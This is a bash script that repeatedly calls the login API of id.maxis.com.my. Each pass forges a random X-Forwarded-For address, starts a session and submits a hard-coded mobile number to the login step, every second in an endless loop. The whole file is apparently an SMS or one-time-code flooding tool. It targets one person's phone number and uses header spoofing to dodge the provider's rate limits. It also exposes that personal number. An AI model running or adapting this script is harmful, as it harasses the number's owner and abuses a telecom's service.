#!/bin/bash
while true; do
    # for MacOS
    #postdata="next=%2F&username=bien&password=somepass&remember_me=on&submit="
    oc1=`jot -r 1  1 255`
    oc2=`jot -r 1  1 255`
    oc3=`jot -r 1  1 255`
    oc4=`jot -r 1  1 255`
    ipaddr="$oc1.$oc2.$oc3.$oc4"
    xff="X-Forwarded-For: $ipaddr"
    
    didA="AaZHN2BBBBBBjAY3fLSqDLPwaTwCq6aI"
    didB="AS5q4jNm2lKg4SXCyJRF0AQ8vTwCq6aI"
    
    cookie_1="_imp_apg_r_=%7B%22diA%22%3A%22$didA%22%2C%22diB%22%3A%22$didB%22%7D"

    postdata="{\"additionalParameters\":{\"brand\":\"Maxis\",\"loginMethod\":\"mobile\",\"rememberMe\":true}}"
    
    fetchprocessId=$(curl -k -i 'https://id.maxis.com.my/rest/v60/session/start?' -X POST \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/86.0' \
    -H 'Accept: application/json, text/plain, */*' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: en-US,en;q=0.9,ms;q=0.8' \
    -H 'Cache-Control: no-cache' \
    -H 'Connection: keep-alive' \
    -H 'Content-Length: 83' \
    -H 'Content-Type: application/json' \
    -H 'Host: id.maxis.com.my' \
    -H 'Origin: https://id.maxis.com.my' \
    -H 'Pragma: no-cache' \
    -H 'Referer: https://id.maxis.com.my/login' \
    -H "${xff//[$'\t\r\n ']}" \
    --cookie $cookie_1 \
    --data-raw $postdata)

    eval "array=($fetchprocessId)"
    temp1="${array[2]}"
    temp=("${(@s[:])temp1}")
    processId="${temp[2]}"

    postdata="{\"actionType\":\"com.uxpsystems.mint.framework.bpm.process.ManualInputStepAction\",\"processId\":\"$processId\",\"parameters\":{\"mobile\":\"60179151575\"}}"

    curl -k -i 'https://id.maxis.com.my/rest/v60/process/step' -X PUT \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/86.0' \
    -H 'Accept: application/json, text/plain, */*' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    -H 'Cache-Control: no-cache' \
    -H 'Connection: keep-alive' \
    -H 'Content-Length: 169' \
    -H 'Content-Type: application/json' \
    -H 'Origin: https://id.maxis.com.my' \
    -H 'Pragma: no-cache' \
    -H 'Referer: https://id.maxis.com.my/login' \
    -H "${xff//[$'\t\r\n ']}" \
    --cookie $cookie_1 \
    --data-raw $postdata
sleep 1
done
